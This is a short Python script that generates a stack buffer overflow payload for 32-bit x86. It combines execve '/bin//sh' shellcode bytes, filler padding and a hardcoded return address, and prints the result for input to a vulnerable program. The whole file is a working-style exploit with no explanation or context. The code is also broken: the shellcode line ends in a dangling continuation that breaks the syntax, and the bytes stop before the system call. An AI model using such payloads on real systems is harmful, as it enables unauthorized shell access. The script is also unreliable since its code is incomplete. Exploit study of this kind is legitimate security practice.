#! /usr/bin/python

length = 76

#0xbffffc70
shell_addr = '\x70\xfc\xff\xbf'

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
            "\x68\x68\x2f\x62\x69\x6e\x89" + \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \


padding = 'a' * (length - len(shellcode))

payload = shellcode + padding + shell_addr

print(payload)


